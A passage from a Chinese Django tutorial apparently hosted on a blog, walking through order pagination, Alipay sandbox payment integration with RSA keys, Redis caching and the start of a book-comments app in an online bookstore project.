%&#125;"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>&#123;&#123; page &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        &#123;% else %&#125;</span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:order' page=page %&#125;"</span>&gt;</span>&#123;&#123; page &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        &#123;% endif %&#125;</span><br><span class="line">                    &#123;% endfor %&#125;</span><br><span class="line">                    &#123;% if order_li.has_next %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'user:order' page=order_li.next_page_number %&#125;"</span>&gt;</span>下一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    &#123;% endif %&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br></pre></td></tr></table></figure></p><p>这样我们个人中心的订单的显示页面也就做完了。</p><h2 id="7，“去付款”功能的实现"><a href="#7，“去付款”功能的实现" class="headerlink" title="7，“去付款”功能的实现"></a>7，“去付款”功能的实现</h2><p>接下来我们需要实现“去付款”功能。这里需要集成阿里的支付宝sdk。<br>我们先来编写后端代码。</p><p>生成秘钥文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl</span><br><span class="line">OpenSSL&gt; genrsa -out app_private_key.pem <span class="number">2048</span>  <span class="comment"># 私钥</span></span><br><span class="line">OpenSSL&gt; rsa -<span class="keyword">in</span> app_private_key.pem -pubout -out app_public_key.pem <span class="comment"># 导出公钥</span></span><br><span class="line">OpenSSL&gt; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></p><p>设置支付宝沙箱公钥<br>支付宝逐渐转换为RSA2秘钥，可以使用官方工具生成秘钥<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">支付宝沙箱地址：http<span class="variable">s:</span>//openhome.alipay.<span class="keyword">com</span>/platform/appDaily.htm?<span class="keyword">tab</span>=info</span><br><span class="line">生成RSA2教程：http<span class="variable">s:</span>//docs.<span class="keyword">open</span>.alipay.<span class="keyword">com</span>/<span class="number">291</span>/<span class="number">106130</span></span><br><span class="line">测试用秘钥： 链接: http<span class="variable">s:</span>//pan.baidu.<span class="keyword">com</span>/s/<span class="number">1</span>HpAoD8heei18rXdjRIZdUg 密码: rcip</span><br></pre></td></tr></table></figure></p><p>设置本地公钥&amp;私钥格式<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app_private_key_string.pem</span><br><span class="line"></span><br><span class="line">-<span class="ruby">----<span class="keyword">BEGIN</span> RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="ruby">         私钥内容</span></span><br><span class="line"><span class="ruby">-----<span class="keyword">END</span> RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">alipay_public_key_string.pem</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-----<span class="keyword">BEGIN</span> PUBLIC KEY-----</span></span><br><span class="line"><span class="ruby">         公钥内容</span></span><br><span class="line"><span class="ruby">-----<span class="keyword">END</span> PUBLIC KEY-----</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># order/views.py</span></span><br><span class="line"><span class="comment"># 前端需要发过来的参数:order_id</span></span><br><span class="line"><span class="comment"># post</span></span><br><span class="line"><span class="comment"># 接口文档：https://github.com/fzlee/alipay/blob/master/README.zh-hans.md</span></span><br><span class="line"><span class="comment"># 安装python-alipay-sdk</span></span><br><span class="line"><span class="comment"># pip install python-alipay-sdk --upgrade</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> alipay <span class="keyword">import</span> AliPay</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_pay</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''订单支付'''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收订单id</span></span><br><span class="line">    order_id = request.POST.get(<span class="string">'order_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> order_id:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'errmsg'</span>: <span class="string">'订单不存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        order = OrderInfo.objects.get(order_id=order_id,</span><br><span class="line">                                      status=<span class="number">1</span>,</span><br><span class="line">                                      pay_method=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> OrderInfo.DoesNotExist:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>, <span class="string">'errmsg'</span>: <span class="string">'订单信息出错'</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将app_private_key.pem和app_public_key.pem拷贝到order文件夹下。</span></span><br><span class="line">    app_private_key_path = os.path.join(settings.BASE_DIR, <span class="string">'order/app_private_key.pem'</span>)</span><br><span class="line">    alipay_public_key_path = os.path.join(settings.BASE_DIR, <span class="string">'order/app_public_key.pem'</span>)</span><br><span class="line"></span><br><span class="line">    app_private_key_string = open(app_private_key_path).read()</span><br><span class="line">    alipay_public_key_string = open(alipay_public_key_path).read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 和支付宝进行交互</span></span><br><span class="line">    alipay = AliPay(</span><br><span class="line">        appid=<span class="string">"2016091500515408"</span>, <span class="comment"># 应用id</span></span><br><span class="line">        app_notify_url=<span class="keyword">None</span>,  <span class="comment"># 默认回调url</span></span><br><span class="line">        app_private_key_string=app_private_key_string,</span><br><span class="line">        alipay_public_key_string=alipay_public_key_string,  <span class="comment"># 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥,</span></span><br><span class="line">        sign_type = <span class="string">"RSA2"</span>,  <span class="comment"># RSA 或者 RSA2</span></span><br><span class="line">        debug = <span class="keyword">True</span>,  <span class="comment"># 默认False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 电脑网站支付，需要跳转到https://openapi.alipaydev.com/gateway.do? + order_string</span></span><br><span class="line">    total_pay = order.total_price + order.transit_price <span class="comment"># decimal</span></span><br><span class="line">    order_string = alipay.api_alipay_trade_page_pay(</span><br><span class="line">        out_trade_no=order_id, <span class="comment"># 订单id</span></span><br><span class="line">        total_amount=str(total_pay), <span class="comment"># Json传递，需要将浮点转换为字符串</span></span><br><span class="line">        subject=<span class="string">'尚硅谷书城%s'</span> % order_id,</span><br><span class="line">        return_url=<span class="keyword">None</span>,</span><br><span class="line">        notify_url=<span class="keyword">None</span>  <span class="comment"># 可选, 不填则使用默认notify url</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 返回应答</span></span><br><span class="line">    pay_url = settings.ALIPAY_URL + <span class="string">'?'</span> + order_string</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">3</span>, <span class="string">'pay_url'</span>: pay_url, <span class="string">'message'</span>: <span class="string">'OK'</span>&#125;)</span><br></pre></td></tr></table></figure><p>然后我们把公钥和私钥拷贝到order文件夹下。<br>然后我们需要获取用户的支付结果。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前端需要发过来的参数:order_id</span></span><br><span class="line"><span class="comment"># post</span></span><br><span class="line"><span class="keyword">from</span> alipay <span class="keyword">import</span> AliPay</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_pay</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''获取用户支付的结果'''</span></span><br><span class="line"></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    <span class="comment"># 接收订单id</span></span><br><span class="line">    order_id = request.POST.get(<span class="string">'order_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> order_id:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">1</span>, <span class="string">'errmsg'</span>: <span class="string">'订单不存在'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        order = OrderInfo.objects.get(order_id=order_id,</span><br><span class="line">                                      passport_id=passport_id,</span><br><span class="line">                                      pay_method=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> OrderInfo.DoesNotExist:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>: <span class="number">2</span>, <span class="string">'errmsg'</span>: <span class="string">'订单信息出错'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    app_private_key_path = os.path.join(settings.BASE_DIR, <span class="string">'order/app_private_key.pem'</span>)</span><br><span class="line">    alipay_public_key_path = os.path.join(settings.BASE_DIR, <span class="string">'order/app_public_key.pem'</span>)</span><br><span class="line"></span><br><span class="line">    app_private_key_string = open(app_private_key_path).read()</span><br><span class="line">    alipay_public_key_string = open(alipay_public_key_path).read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 和支付宝进行交互</span></span><br><span class="line">    alipay = AliPay(</span><br><span class="line">        appid=<span class="string">"2016091500515408"</span>, <span class="comment"># 应用id</span></span><br><span class="line">        app_notify_url=<span class="keyword">None</span>,  <span class="comment"># 默认回调url</span></span><br><span class="line">        app_private_key_string=app_private_key_string,</span><br><span class="line">        alipay_public_key_string=alipay_public_key_string,  <span class="comment"># 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥,</span></span><br><span class="line">        sign_type = <span class="string">"RSA2"</span>,  <span class="comment"># RSA 或者 RSA2</span></span><br><span class="line">        debug = <span class="keyword">True</span>,  <span class="comment"># 默认False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment"># 进行支付结果查询</span></span><br><span class="line">        result = alipay.api_alipay_trade_query(order_id)</span><br><span class="line">        code = result.get(<span class="string">'code'</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">'10000'</span> <span class="keyword">and</span> result.get(<span class="string">'trade_status'</span>) == <span class="string">'TRADE_SUCCESS'</span>:</span><br><span class="line">            <span class="comment"># 用户支付成功</span></span><br><span class="line">            <span class="comment"># 改变订单支付状态</span></span><br><span class="line">            order.status = <span class="number">2</span> <span class="comment"># 待发货</span></span><br><span class="line">            <span class="comment"># 填写支付宝交易号</span></span><br><span class="line">            order.trade_id = result.get(<span class="string">'trade_no'</span>)</span><br><span class="line">            order.save()</span><br><span class="line">            <span class="comment"># 返回数据</span></span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>:<span class="number">3</span>, <span class="string">'message'</span>:<span class="string">'支付成功'</span>&#125;)</span><br><span class="line">        <span class="keyword">elif</span> code == <span class="string">'40004'</span> <span class="keyword">or</span> (code == <span class="string">'10000'</span> <span class="keyword">and</span> result.get(<span class="string">'trade_status'</span>) == <span class="string">'WAIT_BUYER_PAY'</span>):</span><br><span class="line">            <span class="comment"># 支付订单还未生成，继续查询</span></span><br><span class="line">            <span class="comment"># 用户还未完成支付，继续查询</span></span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 支付出错</span></span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'res'</span>:<span class="number">4</span>, <span class="string">'errmsg'</span>:<span class="string">'支付出错'</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>配置支付宝gateway到配置文件中。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALIPAY_URL=<span class="string">'https://openapi.alipaydev.com/gateway.do'</span></span><br></pre></td></tr></table></figure></p><p>配置urls.py。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^pay/$'</span>, views.order_pay, name=<span class="string">'pay'</span>), <span class="comment"># 订单支付</span></span><br><span class="line">url(<span class="string">r'^check_pay/$'</span>, views.check_pay, name=<span class="string">'check_pay'</span>), <span class="comment"># 查询支付结果</span></span><br></pre></td></tr></table></figure></p><p>然后编写前端jquery代码，来处理支付后的结果，比如支付成功以后刷新页面。以下代码写入<code>templates/users/user_center_order.html</code>中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block bottomfiles%&#125;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">'.oper_btn'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 获取订单id和订单的状态</span></span><br><span class="line">            order_id = $(<span class="keyword">this</span>).attr(<span class="string">'order_id'</span>)</span><br><span class="line">            order_status = $(<span class="keyword">this</span>).attr(<span class="string">'order_status'</span>)</span><br><span class="line">            csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span><br><span class="line">            params = &#123;<span class="string">'order_id'</span>:order_id, <span class="string">'csrfmiddlewaretoken'</span>:csrf&#125;</span><br><span class="line">            <span class="keyword">if</span> (order_status == <span class="number">1</span>)&#123;</span><br><span class="line">                $.post(<span class="string">'/order/pay/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (data.res == <span class="number">3</span>)&#123;</span><br><span class="line">                        <span class="comment">// 把用户引导支付页面</span></span><br><span class="line">                        <span class="built_in">window</span>.open(data.pay_url)</span><br><span class="line">                        <span class="comment">// 查询用户的支付结果</span></span><br><span class="line">                        $.post(<span class="string">'/order/check_pay/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">if</span> (data.res == <span class="number">3</span>)&#123;</span><br><span class="line">                                alert(<span class="string">'支付成功'</span>)</span><br><span class="line">                                <span class="comment">// 重新刷新页面</span></span><br><span class="line">                                location.reload()</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span>&#123;</span><br><span class="line">                                alert(data.errmsg)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        alert(data.errmsg)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&#123;% endblock bottomfiles %&#125;</span></span><br></pre></td></tr></table></figure></p><p>好，我们支付功能也编写好了。</p><h1 id="7，使用缓存"><a href="#7，使用缓存" class="headerlink" title="7，使用缓存"></a><a id="7">7，使用缓存</a></h1><p>使用redis缓存首页的页面。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.views.decorators.cache <span class="keyword">import</span> cache_page</span><br><span class="line"><span class="meta">@cache_page(60 * 15)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''显示首页'''</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>别忘了把redis启动起来。<br>在settings.py中配置redis缓存。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install django-redis</span></span><br><span class="line">CACHES = &#123;</span><br><span class="line">    <span class="string">"default"</span>: &#123;</span><br><span class="line">        <span class="string">"BACKEND"</span>: <span class="string">"django_redis.cache.RedisCache"</span>,</span><br><span class="line">        <span class="string">"LOCATION"</span>: <span class="string">"redis://127.0.0.1:6379/2"</span>,</span><br><span class="line">        <span class="string">"OPTIONS"</span>: &#123;</span><br><span class="line">            <span class="string">"CLIENT_CLASS"</span>: <span class="string">"django_redis.client.DefaultClient"</span>,</span><br><span class="line">            <span class="string">"PASSWORD"</span>: <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SESSION_ENGINE = <span class="string">"django.contrib.sessions.backends.cache"</span></span><br><span class="line">SESSION_CACHE_ALIAS = <span class="string">"default"</span></span><br></pre></td></tr></table></figure></p><h1 id="8，评论功能的实现"><a href="#8，评论功能的实现" class="headerlink" title="8，评论功能的实现"></a><a id="8">8，评论功能的实现</a></h1><p>先来新建comments应用。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python manage.py startapp comments</span></span><br></pre></td></tr></table></figure></p><p>然后设计数据库表结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> db.base_model <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> users.models <span class="keyword">import</span> Passport</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comments</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    disabled = models.BooleanField(default=<span class="keyword">False</span>, verbose_name=<span class="string">"禁用评论"</span>)</span><br><span class="line">    user = models.ForeignKey(<span class="string">'users.Passport'</span>, verbose_name=<span class="string">"用户ID"</span>)</span><br><span class="line">    book = models.ForeignKey(<span class="string">'books.Books'</span>, verbose_name=<span class="string">"书籍ID"</span>)</span><br><span class="line">    content = models.CharField(max_length=<span class="number">1000</span>, verbose_name=<span class="string">"评论内容"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'s_comment_table'</span></span><br></pre></td></tr></table></figure><p>这里要注意外键的使用和理解。<br>然后我们要在配置文件里注册app。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bookstore/settings.py</span></span><br><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">'comments'</span>, <span class="comment"># 评论模块</span></span><br><span class="line">    ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后我们来写评论应用的视图函数。视图函数使用redis作为缓存，缓存了get请求的结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># comments/views.py</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.http <span class="keyword">import</span> require_http_methods</span><br><span class="line"><span class="keyword">from</span> comments.models <span class="keyword">import</span> Comments</span><br><span class="line"><span class="keyword">from</span> books.models <span class="keyword">import</span> Books</span><br><span class="line"><span class="keyword">from</span> users.models <span class="keyword">import</span> Passport</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> utils.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="comment"># 设置过期时间</span></span><br><span class="line">EXPIRE_TIME = <span class="number">60</span> * <span class="number">10</span></span><br><span class="line"><span class="comment"># 连接redis数据库</span></span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">'localhost'</span>, port=<span class="number">6379</span>, db=<span class="number">2</span>)</span><br><span class="line">redis_db = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="meta">@require_http_methods(['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(request, books_id)</span>:</span></span><br><span class="line">    book_id = books_id</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="comment"># 先在redis里面寻找评论</span></span><br><span class="line">        c = redis_db.get(<span class="string">'comment_%s'</span> % book_id)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = c.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        print(<span class="string">'c: '</span>, c)</span><br><span class="line">        <span class="keyword">if</span> c:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;</span><br><span class="line">                    <span class="string">'code'</span>: <span class="number">200</span>,</span><br><span class="line">                    <span class="string">'data'</span>: json.loads(c),</span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 找不到，就从数据库里面取</span></span><br><span class="line">            comments = Comments.objects.filter(book_id=book_id)</span><br><span class="line">            data = []</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> comments:</span><br><span class="line">                data.append(&#123;</span><br><span class="line">                    <span class="string">'user_id'</span>: c.user_id,</span><br><span class="line">                    <span class="string">'content'</span>: c.content,</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            res = &#123;</span><br><span class="line">                <span class="string">'code'</span>: <span class="number">200</span>,</span><br><span class="line">                <span class="string">'data'</span>: data, </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                redis_db.setex(<span class="string">'comment_%s'</span> % book_id, json.dumps(data), EXPIRE_TIME)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">'e: '</span>, e)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        params = json.loads(request.body.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">        book_id = params.get(<span class="string">'book_id'</span>)</span><br><span class="line">        user_id = params.get(<span class="string">'user_id'</span>)</span><br><span class="line">        content = params.get(<span class="string">'content'</span>)</span><br><span class="line"></span><br><span class="line">        book = 